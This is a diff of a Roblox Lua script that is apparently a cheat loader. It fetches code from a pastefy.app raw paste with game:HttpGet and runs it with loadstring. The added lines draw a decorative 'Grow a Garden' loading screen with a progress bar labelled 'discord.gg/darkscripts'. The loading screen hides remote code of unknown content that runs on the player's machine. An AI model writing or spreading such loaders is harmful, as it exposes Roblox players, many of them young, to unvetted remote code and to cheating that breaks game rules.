@@ -1,1 +1,84 @@
 loadstring(game:HttpGet("https://pastefy.app/RJINtroL/raw"))()
+-- Roblox GUI version of the loading screen
+
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "GardenLoadingScreen"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create background frame
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
+bg.BorderSizePixel = 0
+bg.Parent = screenGui
+
+-- Add gradient background
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new {
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 200, 200)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(17, 17, 17))
+}
+gradient.Rotation = 45
+gradient.Parent = bg
+
+-- Create title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 100)
+title.Position = UDim2.new(0, 0, 0.3, -100)
+title.BackgroundTransparency = 1
+title.Text = "🌴 Grow a Garden 🌴"
+title.TextColor3 = Color3.new(1, 1, 1)
+title.Font = Enum.Font.SourceSansBold
+title.TextScaled = true
+title.TextStrokeTransparency = 0.5
+title.Parent = bg
+
+-- Create loading bar container
+local barContainer = Instance.new("Frame")
+barContainer.Size = UDim2.new(0.8, 0, 0, 40)
+barContainer.Position = UDim2.new(0.1, 0, 0.5, 0)
+barContainer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+barContainer.BackgroundTransparency = 0.8
+barContainer.BorderSizePixel = 2
+barContainer.Parent = bg
+
+-- Round corners
+local uic = Instance.new("UICorner")
+uic.CornerRadius = UDim.new(0, 20)
+uic.Parent = barContainer
+
+-- Create loading bar fill
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.new(1, 1, 1)
+barFill.Parent = barContainer
+
+local uicFill = Instance.new("UICorner")
+uicFill.CornerRadius = UDim.new(0, 20)
+uicFill.Parent = barFill
+
+-- Create label inside bar
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, 0, 1, 0)
+label.BackgroundTransparency = 1
+label.Text = "discord.gg/darkscripts"
+label.TextColor3 = Color3.new(0, 0, 0)
+label.Font = Enum.Font.SourceSansBold
+label.TextScaled = true
+label.Parent = barFill
+
+-- Animate loading over 10 seconds
+local TweenService = game:GetService("TweenService")
+local tween = TweenService:Create(barFill, TweenInfo.new(10, Enum.EasingStyle.Linear), {
+    Size = UDim2.new(1, 0, 1, 0)
+})
+tween:Play()
+
+-- Optional: remove GUI after loading
+-- tween.Completed:Connect(function()
+--     screenGui:Destroy()
+-- end)
